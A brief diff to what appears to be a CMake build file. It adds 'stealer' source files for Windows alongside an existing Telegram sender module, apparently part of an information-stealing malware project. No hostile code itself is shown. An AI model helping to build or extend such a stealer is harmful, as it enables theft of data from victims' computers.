@@ -8,6 +8,9 @@ add_executable(${PROJECT_NAME} main.cpp
         senders/telegram_sender.cpp
         senders/telegram_sender.h
         net.h
+        stealers/base_stealer.h
+        stealers/win_stealer.cpp
+        stealers/win_stealer.h
 )
 
 target_link_libraries(${PROJECT_NAME} PRIVATE ${Boost_LIBRARIES} openssl::openssl)
